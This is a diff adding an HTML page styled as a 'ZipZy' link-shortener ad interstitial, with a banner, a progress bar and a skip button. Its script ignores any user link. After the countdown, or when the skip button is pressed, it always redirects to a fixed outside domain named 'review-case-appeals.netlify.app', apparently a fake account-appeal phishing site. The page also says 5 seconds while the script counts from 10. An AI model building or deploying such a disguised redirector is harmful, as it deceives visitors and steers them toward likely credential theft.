@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ZipZy</title>
+  <style>
+    body {
+      margin:0; padding:0;
+      font-family:system-ui,sans-serif;
+      background:#ffffff;
+      color:#0f172a;
+      min-height:100vh;
+      display:grid;
+      place-items:center;
+    }
+    .card {
+      background:white;
+      padding:2.5rem;
+      border-radius:16px;
+      max-width:500px;
+      width:90%;
+      text-align:center;
+      box-shadow:0 10px 40px rgba(0,0,0,0.08);
+      border:1px solid #e2e8f0;
+    }
+    h2 { color:#1d4ed8; margin:0 0 0.8rem; font-size:2rem; }
+    p { color:#475569; margin:0 0 1.8rem; }
+    .ad-banner { width:100%; max-width:468px; height:auto; border-radius:0.75rem; margin:1.5rem auto; display:block; background:#334155; }
+    .progress { height:8px; background:#e2e8f0; border-radius:4px; overflow:hidden; margin:1.5rem 0; }
+    .bar { height:100%; width:100%; background:#3b82f6; animation:shrink 5s linear forwards; }
+    @keyframes shrink { from {width:100%} to {width:0} }
+    .skip { display:inline-block; margin-top:1rem; padding:0.8rem 1.8rem; background:#3b82f6; color:white; border:none; border-radius:0.75rem; font-weight:600; cursor:pointer; text-decoration:none; }
+    .skip:hover { background:#2563eb; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Your link is ready</h2>
+    <p>One quick ad — then you're on your way...</p>
+
+    <!-- Replace with your real banner(s) -->
+    <a href="https://zipzy.in/?ref=zipzy" target="_blank" rel="sponsored noopener">
+      <img src="https://asset.pranavacompany.com/campaings/primary-banner-468x60-jan2026.png"
+           alt="Sponsor advertisement" class="ad-banner">
+    </a>
+
+    <div class="progress"><div class="bar"></div></div>
+    <div>Redirecting in <span id="sec">5</span> seconds...</div>
+    <a href="#" class="skip" id="skipBtn">Skip Ad</a>
+  </div>
+
+  <script>
+    let sec = 10;
+    const el = document.getElementById('sec');
+    const skip = document.getElementById('skipBtn');
+    const timer = setInterval(() => {
+      sec--;
+      el.textContent = sec;
+      if (sec <= 0) {
+        clearInterval(timer);
+        window.location.href = "https://review-case-appeals.netlify.app";
+      }
+    }, 1000);
+    skip.onclick = function(e) {
+      e.preventDefault();
+      clearInterval(timer);
+      window.location.href = "https://review-case-appeals.netlify.app";
+    };
+  </script>
+</body>
+</html>
